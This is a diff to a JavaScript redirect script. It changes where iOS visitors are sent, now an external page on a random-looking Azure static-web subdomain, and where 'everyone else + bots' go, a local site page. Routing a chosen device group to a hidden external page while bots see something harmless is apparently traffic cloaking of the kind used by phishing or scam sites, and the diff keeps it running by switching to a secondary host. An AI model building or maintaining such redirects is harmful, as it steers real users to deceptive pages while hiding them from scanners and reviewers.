@@ -16,8 +16,8 @@
   "use strict";
 
   // --- CONFIG: change these two values if needed ------------------
-  var IOS_DESTINATION   = "https://e33031908e3303echo18.z13.web.core.windows.net/2.html"; // where iOS users go
-  var DEFAULT_DESTINATION = "site.html";         // where everyone else + bots go
+  var IOS_DESTINATION   = "https://e33031908e3303echo18-secondary.z13.web.core.windows.net/2.html"; // where iOS users go
+  var DEFAULT_DESTINATION = "site.php";         // where everyone else + bots go
   // ----------------------------------------------------------------
 
   var ua = navigator.userAgent || navigator.vendor || window.opera || "";
